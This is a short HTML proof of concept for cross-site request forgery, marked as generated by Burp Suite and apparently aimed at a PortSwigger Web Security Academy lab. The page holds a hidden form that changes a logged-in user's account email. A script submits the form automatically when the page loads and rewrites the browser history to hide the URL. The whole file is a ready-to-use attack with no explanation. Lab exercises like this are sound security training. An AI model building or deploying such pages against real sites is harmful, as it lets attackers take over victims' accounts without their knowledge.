```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aef00fa03803015822483d6000f0099.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="zxxxxx&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
